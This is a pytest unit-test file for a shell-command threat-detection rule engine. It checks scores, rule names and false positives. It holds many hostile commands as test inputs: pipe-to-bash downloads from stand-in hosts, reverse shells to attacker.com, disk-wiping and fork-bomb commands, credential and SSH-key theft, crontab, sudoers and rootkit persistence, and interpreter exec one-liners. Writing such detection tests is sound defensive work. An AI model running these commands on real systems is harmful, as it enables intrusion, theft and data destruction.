"""
test_01_rule_engine.py — Unit tests for backend/detection/rule_engine.py

Tests every rule category independently, checks score capping,
and validates edge-case inputs (empty, whitespace, very long commands).

Run:
    pytest large_test_set/test_01_rule_engine.py -v
"""

import pytest
from backend.detection.rule_engine import RuleEngine


# ---------------------------------------------------------------------------
# Fixture
# ---------------------------------------------------------------------------

@pytest.fixture
def engine():
    """Fresh RuleEngine for each test (singleton reset handled by conftest)."""
    return RuleEngine()


# ===========================================================================
# 1. Shell Piping (curl/wget | bash)
# ===========================================================================

class TestShellPiping:

    @pytest.mark.parametrize("cmd", [
        "curl http://evil.com/script.sh | bash",
        "wget http://evil.com/payload | sh",
        "python3 -c 'code' | bash",
        "curl https://x.com/a.sh|bash",            # no spaces around pipe
        "perl -e 'x' | bash",
        "ruby script.rb | sh",
        "php payload.php | bash",
        "node -e 'x' | bash",
        "awk '{print}' file | bash",
        "curl http://x.com || bash fallback.sh",   # OR operator
        "wget http://x.com && bash payload.sh",    # AND operator
    ])
    def test_shell_piping_detected(self, engine, cmd):
        score, rules = engine.score_rules(cmd)
        assert "shell_piping" in rules, f"shell_piping not detected in: {cmd!r}"
        assert score >= 25

    @pytest.mark.parametrize("cmd", [
        "ls -la",
        "echo hello | tee output.txt",             # benign pipe
        "cat file.txt | wc -l",                    # benign pipe
        "grep error log.txt | head -20",           # benign pipe
        "ps aux | grep python",                    # benign pipe
        "df -h | sort",                            # benign pipe
    ])
    def test_shell_piping_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "shell_piping" not in rules, \
            f"False positive — shell_piping triggered on safe: {cmd!r}"


# ===========================================================================
# 2. Reverse Shell Patterns
# ===========================================================================

class TestReverseShell:

    @pytest.mark.parametrize("cmd", [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "bash -i >& /dev/udp/attacker.com/53 0>&1",
        "sh -i >& /dev/tcp/attacker.com/8080 0>&1",
        "nc -e /bin/bash attacker.com 4444",
        "nc -l -p 4444 -e /bin/bash",
        "ncat -l -p 4444 -e /bin/sh",
        "ncat --exec /bin/bash attacker.com 4444",
        "socat exec:'/bin/bash' TCP-LISTEN:4444",
        "socat TCP:attacker.com:4444 EXEC:/bin/bash",
        "tclsh -c 'exec /bin/bash'",
    ])
    def test_reverse_shell_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "reverse_shell_pattern" in rules, \
            f"reverse_shell_pattern not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "ls /dev/tcp",                             # listing the path, not using it
        "echo /dev/tcp",                           # just echoing
        "man nc",                                  # nc help
    ])
    def test_reverse_shell_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "reverse_shell_pattern" not in rules, \
            f"False positive — reverse_shell triggered on: {cmd!r}"


# ===========================================================================
# 3. Destructive Patterns
# ===========================================================================

class TestDestructivePatterns:

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "rm -rf / --no-preserve-root",
        "rm -rf /*",
        "mkfs.ext4 /dev/sda1",
        "mkfs.vfat /dev/sdb",
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/random of=/dev/sdb",
        "dd if=/dev/mem of=/dev/sda",
        ":(){ :|:& };:",                           # bash fork bomb
    ])
    def test_destructive_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "destructive_pattern" in rules, \
            f"destructive_pattern not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "rm -rf /tmp/test_folder",                 # safe rm
        "rm file.txt",                             # safe rm
        "dd if=backup.img of=/dev/null",           # safe dd (output to null)
        "dd if=file.img of=copy.img",              # safe dd (file to file)
    ])
    def test_destructive_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "destructive_pattern" not in rules, \
            f"False positive — destructive triggered on: {cmd!r}"


# ===========================================================================
# 4. Privilege Escalation
# ===========================================================================

class TestPrivilegeEscalation:

    @pytest.mark.parametrize("cmd", [
        "sudo -u root /bin/bash -i",
        "sudo -u root whoami",
        "su -",
        "su root",
        "su -c 'whoami'",
        "chmod 777 /etc/shadow",
        "chmod 777 /etc/passwd",
    ])
    def test_privesc_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "privilege_escalation" in rules, \
            f"privilege_escalation not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "sudo systemctl status nginx",             # normal sudo usage
        "chmod 644 file.txt",                      # safe chmod
        "chmod +x script.sh",                      # safe chmod
        "su user",                                 # switch to non-root user
    ])
    def test_privesc_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "privilege_escalation" not in rules, \
            f"False positive — privesc triggered on: {cmd!r}"


# ===========================================================================
# 5. Data Exfiltration
# ===========================================================================

class TestDataExfiltration:

    @pytest.mark.parametrize("cmd", [
        "cat /etc/shadow > /tmp/leak.txt",
        "cat /etc/passwd > /tmp/passwd_copy.txt",
        "cp /root/.ssh/id_rsa /tmp/key",
        "tar czf /tmp/out.tar.gz /root/.ssh",
    ])
    def test_exfiltration_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "data_exfiltration" in rules, \
            f"data_exfiltration not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "cat /etc/hostname",                       # safe read
        "cat file.txt",                            # safe read
        "grep root /etc/passwd",                   # read-only grep
    ])
    def test_exfiltration_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "data_exfiltration" not in rules, \
            f"False positive — exfiltration triggered on: {cmd!r}"


# ===========================================================================
# 6. Encoded Payloads
# ===========================================================================

class TestEncodedPayloads:

    @pytest.mark.parametrize("cmd", [
        'base64 -d <<< "L2Jpbi9iYXNo"',
        'base64 --decode <<< "L2Jpbi9iYXNo"',
        'echo "abc123==" | base64 -d',
        'echo "abc" | base64 | base64 -d',
        r'printf "\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"',
        r'printf "\x41\x41\x41"',
        'xxd -r -p <<< "62617368"',
        'od -An -t x1 <<< "bash"',
    ])
    def test_encoding_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "encoded_payload" in rules, \
            f"encoded_payload not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "base64 file.txt",                         # encoding (not decoding)
        "base64 -e file.txt",                      # encoding flag
        "echo hello | base64",                     # encoding output
    ])
    def test_encoding_not_triggered_on_encode_only(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "encoded_payload" not in rules, \
            f"False positive — encoded_payload triggered on encode-only: {cmd!r}"


# ===========================================================================
# 7. Score Mechanics
# ===========================================================================

class TestScoreMechanics:

    def test_score_never_exceeds_100(self, engine):
        """Stacking every rule category must not exceed 100."""
        ultra_cmd = (
            "curl http://evil.com | bash -i >& /dev/tcp/x/4444; "
            "rm -rf /; cat /etc/shadow > /tmp/x; "
            'base64 -d <<< "abc"; sudo -u root bash'
        )
        score, _ = engine.score_rules(ultra_cmd)
        assert score <= 100.0, f"Score exceeded 100: {score}"

    def test_score_is_non_negative(self, engine):
        score, _ = engine.score_rules("ls")
        assert score >= 0.0

    def test_score_is_float(self, engine):
        score, _ = engine.score_rules("ls")
        assert isinstance(score, float)

    def test_matched_rules_is_list(self, engine):
        _, rules = engine.score_rules("ls")
        assert isinstance(rules, list)

    def test_matched_rules_are_strings(self, engine):
        _, rules = engine.score_rules("curl http://evil.com | bash")
        assert all(isinstance(r, str) for r in rules)

    def test_known_rule_names(self, engine):
        """All returned rule names must be from the known set."""
        known = {
            "shell_piping", "reverse_shell_pattern", "destructive_pattern",
            "privilege_escalation", "data_exfiltration", "encoded_payload",
        }
        ultra = (
            "curl http://x.com | bash -i >& /dev/tcp/x/4444; "
            "rm -rf /; cat /etc/shadow > /tmp/x; "
            'base64 -d <<< "abc"; sudo -u root bash'
        )
        _, rules = engine.score_rules(ultra)
        for r in rules:
            assert r in known, f"Unknown rule name returned: {r!r}"


# ===========================================================================
# 8. Edge Cases
# ===========================================================================

class TestEdgeCases:

    def test_empty_string(self, engine):
        score, rules = engine.score_rules("")
        assert score == 0.0
        assert rules == []

    def test_whitespace_only(self, engine):
        score, rules = engine.score_rules("   \t\n")
        assert score == 0.0
        assert rules == []

    def test_single_character(self, engine):
        score, rules = engine.score_rules("x")
        assert score == 0.0
        assert rules == []

    def test_very_long_safe_command(self, engine):
        """10 KB of safe text must not crash and must score 0."""
        long_cmd = "ls " + "A" * 10_000
        score, rules = engine.score_rules(long_cmd)
        assert score == 0.0
        assert rules == []

    def test_newline_in_command(self, engine):
        """Commands with embedded newlines must not crash."""
        cmd = "ls\nrm -rf /"
        score, rules = engine.score_rules(cmd)
        assert isinstance(score, float)

    def test_unicode_command(self, engine):
        score, rules = engine.score_rules("echo '你好世界'")
        assert score == 0.0
        assert rules == []

    def test_null_byte_in_command(self, engine):
        """Null bytes must not crash the engine."""
        score, rules = engine.score_rules("ls\x00-la")
        assert isinstance(score, float)

    def test_special_regex_characters(self, engine):
        """Commands containing regex metacharacters must not crash."""
        score, rules = engine.score_rules("grep '[0-9]\\+' file.txt")
        assert isinstance(score, float)


# ===========================================================================
# 9. Extended Privilege Escalation — SUID bit, su -c variants, safe sudo FP
# ===========================================================================

class TestPrivescExtended:

    @pytest.mark.parametrize("cmd", [
        "chmod 4755 /bin/bash",
        "chmod u+s /usr/bin/python3",
        "chmod 6755 /tmp/exploit",
        "su -c 'bash'",
        "su -c '/bin/sh'",
        "su -c 'nc -e /bin/bash attacker.com 4444'",
    ])
    @pytest.mark.xfail(reason="Rule engine needs chmod SUID and su -c patterns added")
    def test_suid_and_su_c_variants_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "privilege_escalation" in rules, f"Not caught: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "sudo apt-get install -y curl",
        "sudo apt-get update",
        "sudo pip install requests",
    ])
    def test_package_mgmt_sudo_not_flagged(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "privilege_escalation" not in rules, f"False positive: {cmd!r}"


# ===========================================================================
# 10. Score Weight Regression — per-rule contribution verification
# ===========================================================================

class TestScoreWeightRegression:
    """Verify each individual rule contributes its documented weight."""

    def test_shell_piping_weight_is_45(self, engine):
        score, rules = engine.score_rules("curl http://evil.com | bash")
        assert "shell_piping" in rules
        assert score == 45.0, f"Expected 45.0, got {score}"

    def test_reverse_shell_weight_is_55(self, engine):
        score, rules = engine.score_rules("bash -i >& /dev/tcp/x/4444 0>&1")
        assert "reverse_shell_pattern" in rules
        assert score == 55.0, f"Expected 55.0, got {score}"

    def test_destructive_weight_is_65(self, engine):
        score, rules = engine.score_rules("rm -rf /")
        assert "destructive_pattern" in rules
        assert score == 65.0, f"Expected 65.0, got {score}"

    def test_privesc_weight_is_45(self, engine):
        score, rules = engine.score_rules("sudo -u root whoami")
        assert "privilege_escalation" in rules
        assert score == 45.0, f"Expected 45.0, got {score}"

    def test_exfiltration_weight_is_40(self, engine):
        score, rules = engine.score_rules("cat /etc/shadow > /tmp/x")
        assert "data_exfiltration" in rules
        assert score == 40.0, f"Expected 40.0, got {score}"

    def test_encoded_payload_weight_is_25(self, engine):
        score, rules = engine.score_rules('base64 -d <<< "abc"')
        assert "encoded_payload" in rules
        assert score == 25.0, f"Expected 25.0, got {score}"

    def test_two_rules_sum_and_cap(self, engine):
        """shell_piping(45) + encoded_payload(25) = 70, must not exceed 100."""
        score, rules = engine.score_rules('curl http://evil.com | bash; base64 -d <<< "abc"')
        assert "shell_piping" in rules
        assert "encoded_payload" in rules
        assert score == min(45.0 + 25.0, 100.0), \
            f"Two-rule sum incorrect: got {score}"

    def test_all_rules_capped_at_100(self, engine):
        """Firing all rules simultaneously must never exceed 100."""
        ultra = (
            "curl http://evil.com | bash -i >& /dev/tcp/x/4444; "
            "rm -rf /; cat /etc/shadow > /tmp/x; "
            'base64 -d <<< "abc"; sudo -u root bash'
        )
        score, _ = engine.score_rules(ultra)
        assert score == 100.0, f"Expected cap at 100.0, got {score}"


# ===========================================================================
# 11. Extended Destructive — dd writing image to block device
# ===========================================================================

class TestDestructiveExtended:

    @pytest.mark.parametrize("cmd", [
        "dd if=disk.img of=/dev/sda",
        "dd if=backup.iso of=/dev/sdb1",
        "dd if=payload.img of=/dev/nvme0n1",
    ])
    @pytest.mark.xfail(reason="Rule engine needs 'dd if=X of=/dev/sd*' pattern added")
    def test_dd_image_to_device_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "destructive_pattern" in rules, f"dd-to-device not caught: {cmd!r}"


# ===========================================================================
# 12. Extended Exfiltration — tee to sensitive files, shadow backup FP
# ===========================================================================

class TestExfiltrationExtended:

    def test_shadow_backup_file_not_flagged(self, engine):
        """/etc/shadow- (backup file with dash suffix) must not trigger."""
        _, rules = engine.score_rules("cat /etc/shadow-")
        assert "data_exfiltration" not in rules, \
            "False positive — /etc/shadow- backup file incorrectly flagged"

    @pytest.mark.parametrize("cmd", [
        "echo 'root2 ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers",
        "echo payload | tee -a /etc/passwd",
    ])
    @pytest.mark.xfail(reason="Rule engine needs 'tee.*-a.*/etc/(sudoers|passwd)' pattern")
    def test_tee_to_sensitive_files_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert len(rules) > 0, f"tee write to sensitive file missed: {cmd!r}"


# ===========================================================================
# 13. Multiline Commands and Kernel Paths
# ===========================================================================

class TestMultilineAndKernelPaths:

    def test_multiline_attack_still_detected(self, engine):
        """An attack split across an embedded newline must still be caught."""
        cmd = "ls\ncurl http://evil.com | bash"
        _, rules = engine.score_rules(cmd)
        assert "shell_piping" in rules, \
            "shell_piping missed when attack spans newline boundary"

    def test_multiline_destructive_still_detected(self, engine):
        cmd = "echo hello\nrm -rf /"
        _, rules = engine.score_rules(cmd)
        assert "destructive_pattern" in rules

    @pytest.mark.parametrize("cmd", [
        "cat /proc/kcore > /tmp/mem_dump",
        "echo b > /proc/sysrq-trigger",
    ])
    @pytest.mark.xfail(reason="Rule engine needs /proc/kcore and sysrq-trigger patterns")
    def test_proc_kernel_paths_detected(self, engine, cmd):
        score, _ = engine.score_rules(cmd)
        assert score > 0, f"Kernel proc path not flagged: {cmd!r}"


# ===========================================================================
# 14. Persistence Mechanism Patterns  [NEW]
# Tests that crontab injection, rc.local writes, and kernel module
# insertion are caught at the raw rule-engine level — not just at
# integration level in test_10_shell_attacks.sh.
# ===========================================================================

class TestPersistenceMechanisms:

    @pytest.mark.parametrize("cmd", [
        "echo '* * * * * /tmp/backdoor.sh' | crontab",
        "(crontab -l; echo '* * * * * /tmp/malware.sh') | crontab -",
        "echo '* * * * * curl http://attacker.com/cmd | bash' >> /var/spool/cron/crontabs/root",
        "at now < /tmp/payload.txt",
    ])
    @pytest.mark.xfail(reason="Rule engine needs crontab/at persistence patterns added")
    def test_crontab_injection_detected(self, engine, cmd):
        score, rules = engine.score_rules(cmd)
        assert score > 0, f"Crontab persistence not flagged: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "insmod /tmp/rootkit.ko",
        "modprobe rootkit",
        "echo 'insmod /tmp/rootkit.ko' >> /etc/rc.local",
    ])
    @pytest.mark.xfail(reason="Rule engine needs insmod/modprobe patterns added")
    def test_kernel_module_insertion_detected(self, engine, cmd):
        score, rules = engine.score_rules(cmd)
        assert score > 0, f"Kernel module insertion not flagged: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "echo 'backdoor ALL=(ALL:ALL) ALL' | tee -a /etc/sudoers.d/backdoor",
    ])
    @pytest.mark.xfail(reason="Rule engine needs sudoers write patterns added")
    def test_sudoers_backdoor_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert len(rules) > 0, f"Sudoers backdoor not flagged: {cmd!r}"


# ===========================================================================
# 15. LOLBin Patterns at Rule Engine Level  [NEW]
# Verifies that Living-Off-the-Land interpreter exec() calls are caught
# at score_rules() level — these are currently only tested at pipeline
# or API integration level.
# ===========================================================================

class TestLOLBinPatterns:

    @pytest.mark.parametrize("cmd", [
        "python3 -c \"import os;os.system('cat /etc/shadow')\"",
        "python3 -c \"__import__('os').system('nc -e /bin/bash attacker.com 4444')\"",
        "perl -e 'exec \"/bin/bash\";'",
        "ruby -e \"exec '/bin/bash'\"",
        "php -r 'system(\"/bin/bash\");'",
        "lua -e \"os.execute('/bin/bash')\"",
    ])
    @pytest.mark.xfail(reason="Rule engine needs LOLBin interpreter exec patterns added")
    def test_lolbin_exec_detected(self, engine, cmd):
        score, rules = engine.score_rules(cmd)
        assert score > 0, f"LOLBin exec not flagged: {cmd!r}"


# ===========================================================================
# 16. Named-Pipe / FIFO Reverse Shell Patterns  [NEW]
# mkfifo and mknod-based shells appear in test_10_shell_attacks.sh but
# are never tested at the rule engine unit level.
# ===========================================================================

class TestNamedPipeReverseShell:

    @pytest.mark.parametrize("cmd", [
        "mkfifo /tmp/fifo; bash -i < /tmp/fifo 2>&1 | nc attacker.com 4444 > /tmp/fifo",
        "mknod /tmp/backpipe p && /bin/bash 0</tmp/backpipe | nc attacker.com 4444 1>/tmp/backpipe",
        "nc -l -p 4444 < /bin/bash &",
    ])
    @pytest.mark.xfail(reason="Rule engine needs mkfifo/mknod reverse-shell patterns added")
    def test_named_pipe_shell_detected(self, engine, cmd):
        score, rules = engine.score_rules(cmd)
        assert score > 0, f"Named-pipe reverse shell not flagged: {cmd!r}"


# ===========================================================================
# 17. Return Type Contract  [NEW]
# score_rules() must always return a 2-tuple of (float, list[str]).
# These tests pin the contract so refactors don't silently break callers.
# ===========================================================================

class TestReturnTypeContract:

    def test_return_is_two_tuple(self, engine):
        result = engine.score_rules("ls")
        assert isinstance(result, tuple), "score_rules() must return a tuple"
        assert len(result) == 2, "score_rules() must return exactly 2 elements"

    def test_score_element_is_float(self, engine):
        score, _ = engine.score_rules("ls")
        assert isinstance(score, float), \
            f"score must be float, got {type(score).__name__}"

    def test_rules_element_is_list(self, engine):
        _, rules = engine.score_rules("ls")
        assert isinstance(rules, list), \
            f"rules must be list, got {type(rules).__name__}"

    def test_rules_elements_are_strings(self, engine):
        _, rules = engine.score_rules("curl http://evil.com | bash; rm -rf /")
        assert all(isinstance(r, str) for r in rules), \
            "All rule names must be strings"

    def test_safe_command_rules_is_empty_list(self, engine):
        _, rules = engine.score_rules("ls -la")
        assert rules == [], \
            f"Safe command must return empty rules list, got {rules!r}"

    def test_contract_holds_for_empty_string(self, engine):
        result = engine.score_rules("")
        assert isinstance(result, tuple) and len(result) == 2
        assert isinstance(result[0], float)
        assert isinstance(result[1], list)

    def test_contract_holds_for_unicode(self, engine):
        result = engine.score_rules("echo '你好'")
        assert isinstance(result, tuple) and len(result) == 2
        assert isinstance(result[0], float)
        assert isinstance(result[1], list)